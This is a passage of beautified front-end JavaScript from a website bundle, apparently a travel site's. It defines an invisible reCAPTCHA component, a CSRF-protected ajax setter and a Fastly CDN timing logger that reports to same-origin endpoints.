    runSet: function (b) {
      c.ajax({
        type: "POST",
        headers: {
          "X-CSRF": a.globals.formtoken
        },
        url: this.options.setUrl,
        data: {
          kmkid: b
        }
      });
    }
  });
})(R9, jQuery);
(function (d, f, e, c) {
  d.createComponentClass("common.core.FullyInvisibleCaptcha", {
    options: {
      enabled: !1
    },
    init: function () {
      var a = this;
      this.options.enabled && (this.setupCaptchaCallback(), this.initAPI().then(function () {
        a.fireCaptcha();
      }));
    },
    setupCaptchaCallback: function () {
      var a = this;
      c.onReCaptchaSubmit = function (b) {
        a.captchaResult(b);
      };
      c.onReCaptchaError = function (a) {
        console.log(a);
      };
    },
    initAPI: function () {
      var a = f.Deferred();
      c.recaptchaReady = function () {
        a.resolve();
      };
      var b = e.createElement("script");
      b.type = "text/javascript";
      b.async = !0;
      b.src = "https://www.google.com/recaptcha/api.js?onload\x3drecaptchaReady\x26render\x3dexplicit";
      e.getElementById("recaptcha-root").appendChild(b);
      return a;
    },
    fireCaptcha: function () {
      "undefined" !== typeof grecaptcha && (grecaptcha.render("captcha", {}, !0), grecaptcha.execute());
    },
    captchaResult: function (a) {
      d.action.execute("common.core.FullyInvisibleCaptchaAction", {
        data: a
      });
    }
  });
})(R9, jQuery, document, window);
(function (e, d) {
  e.createComponentClass("common.core.FastlyTiming", {
    options: {
      runTest: !1,
      measurementUrl: "/fastly-timer",
      logUrl: "/s/run/fastlytimerlog"
    },
    init: function () {
      this.options.runTest && this.runTimingRequest();
    },
    runTimingRequest: function () {
      d.ajax({
        type: "POST",
        url: this.options.measurementUrl,
        success: this.logResult.bind(this)
      });
    },
    logResult: function (c, a, b) {
      b && c && c.cluster && (a = b.getResponseHeader("x-served-by"), b = b.getResponseHeader("x-timer"), a && b && (a = a.split(" "), a = a[a.length - 1].split("-"), d.ajax({
        type: "POST",
        url: this.options.logUrl,
        data: {
          cluster: c.cluster,
          timer: b,
          fastlyNode: a[a.length - 1]
        }
      })));
    }
  });
})(R9, jQuery);
new R9.logger().timeEnd("combined");

//# sourceMappingURL=https://www.kayak.com/s/horizon/source-maps/combined.js.map?v=47ba287893da820aeaf3c9c84fac5275615b29d0-14pre-flipped